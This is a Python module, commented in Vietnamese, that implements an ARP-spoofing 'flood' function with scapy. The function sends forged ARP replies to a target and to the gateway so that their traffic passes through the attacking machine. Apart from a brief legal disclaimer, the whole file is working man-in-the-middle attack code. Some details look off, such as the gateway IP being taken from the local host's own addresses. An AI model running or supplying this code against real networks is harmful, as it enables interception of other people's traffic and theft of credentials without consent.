"""Module cung cấp hàm flood để thực hiện tấn công ARP-Spoof.

Lưu ý: Việc tấn công ARP-Spoof có thể vi phạm pháp luật. Chỉ sử dụng cho mục đích nghiên cứu và kiểm thử trong môi trường hợp pháp.
"""

import logging
from time import sleep

from colorama import Fore as F
from getmac import get_mac_address as get_host_mac
from scapy.all import send
from scapy.layers.l2 import ARP

from tools.addons.ip_tools import __get_local_host_ips, __get_mac

# Cấu hình logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Thiết lập địa chỉ IP và MAC cho gateway và host
try:
    local_ips = __get_local_host_ips()
    if not local_ips:
        raise ValueError("Không thể lấy địa chỉ IP cục bộ.")
    GATEWAY_IP = local_ips[0]
    GATEWAY_MAC = __get_mac(GATEWAY_IP)
    HOST_MAC = get_host_mac()
except Exception as e:
    logging.error("Lỗi khi thiết lập thông tin mạng: %s", e)
    raise

def flood(target: str, sleep_interval: float = 0.5) -> None:
    """Gửi liên tục các gói ARP giả mạo nhằm thay đổi bảng ARP của target.

    Sau khi thực hiện, target sẽ tin rằng gateway có địa chỉ MAC là của máy tấn công.

    Args:
        target (str): Địa chỉ IP của mục tiêu tấn công.
        sleep_interval (float, optional): Khoảng thời gian chờ giữa các lần gửi gói. Mặc định là 0.5 giây.

    Returns:
        None
    """
    try:
        # Gói ARP cho target: thông báo rằng gateway có MAC của máy tấn công.
        arp_packet_target = ARP(
            op=2,
            pdst=target,
            hwdst=__get_mac(target),
            psrc=GATEWAY_IP
        )
        send(arp_packet_target, verbose=False)

        # Gói ARP cho gateway: thông báo rằng target có MAC của máy tấn công.
        arp_packet_gateway = ARP(
            op=2,
            pdst=GATEWAY_IP,
            hwdst=GATEWAY_MAC,
            psrc=target
        )
        send(arp_packet_gateway, verbose=False)

        logging.info(
            "%s now thinks that %s (Gateway's MAC) is %s (Your MAC)",
            target, GATEWAY_MAC, HOST_MAC
        )
    except Exception as e:
        logging.error("Lỗi khi gửi gói ARP: %s", e)

    sleep(sleep_interval)